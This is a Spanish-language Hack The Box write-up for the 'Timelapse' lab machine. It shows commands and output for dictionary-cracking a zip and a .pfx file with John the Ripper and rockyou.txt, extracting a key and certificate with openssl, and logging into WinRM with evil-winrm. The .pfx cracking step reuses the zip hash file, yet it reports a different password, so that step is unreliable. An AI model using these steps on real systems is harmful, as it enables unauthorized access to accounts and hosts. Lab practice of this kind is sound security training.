Disclaimer -> Este post está basado en practicas hechas con máquinas de la pltaforma Hack the box, están pensadas para la tecnica por ataque de diccionario con el diccionario rockyuu.txt, asi que estan sacadas de aquí para que funcione. En otro entorno puede que no funcione, (ejemplo contraseñas tipo "124wsf24yrf122rwef1q3r") 

----------------------------------------------------------------

# \Archivos .zip

En la máquina [Timelapse] (https://app.hackthebox.com/machines/Timelapse) de htb nos hemos descargado un zip, pero está protegido con una contraseña.

```console
[cucuxii]-[~/Timelapse]:$ /usr/share/john/zip2john.py winrm_backup.zip > zip_hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683
[cucuxii]-[~/Timelapse]:$ john zip_hash -w=/usr/share/wordlists/rockyou.txt 
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
[cucuxii]-[~/Timelapse]:$ ls 
winrm_backup.zip    legacyy_dev_auth.pfx
```

----------------------------------------------------------------

# \Archivos .pfx

En la máquina [Timelapse] (https://app.hackthebox.com/machines/Timelapse) me he topado con este archuivo, no tenia ni idea de que era hasta que investigué que es un archivo relacionado con temas de encriptación (como una llave).

```console
[cucuxii]-[~/Timelapse]:$ /usr/share/john/pfx2john.py ./legacyy_dev_auth.pfx > pfx_hash
[cucuxii]-[~/Timelapse]:$ john zip_hash -w=/usr/share/wordlists/rockyou.txt 
thuglegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
```
Ya tenemos la contraseña del pfx ¿Y ahora que? Resulta ser que con la busqueda en google "pfx file" sale [esto](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file). Es decir, podemos crear certificados y llaves para conectarnos por el servicio de control remoto de windows "winrm". Te pide contraseñas (tanto PEM como de la clave), es la que hemos sacado antes todo el rato "thuglegacy"

```console
[cucuxii]-[~/Timelapse]:$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out llave.key
[cucuxii]-[~/Timelapse]:$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacy.cert
```
Pero para poder usarlas todavía queda hacer cierta cosa; quitar las cabeceras que te pone. Es decir todo lo que está antes de "----BEGUIN ENCRYPTED PRIVATE KEY----" y "-----BEGIN CERTIFICATE-----", asi se quedan limpias.

```console
evil-winrm -S -k llave.key -c legacy.cert -i 10.10.11.152
```
